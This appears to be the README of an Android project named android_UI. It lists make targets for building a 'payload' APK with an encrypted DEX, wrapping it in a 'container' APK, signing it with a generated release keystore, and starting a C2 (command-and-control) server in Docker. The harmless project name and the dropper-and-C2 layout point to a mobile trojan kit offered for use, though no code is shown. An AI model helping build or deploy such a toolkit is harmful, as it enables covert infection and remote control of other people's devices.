# android_UI

Project structure extracted from Android_UI.zip.

## Build
```
make deps      # install python deps
make keystore  # generate release keystore
make payload   # build payload APK + encrypt DEX
make apk       # build container APK
make c2        # start C2 (docker)
make zip       # package everything
make all       # keystore + payload + apk + zip
make clean     # remove build/
```

## Requirements
- Android SDK / Gradle
- Python 3 + pip
- Docker (for C2)
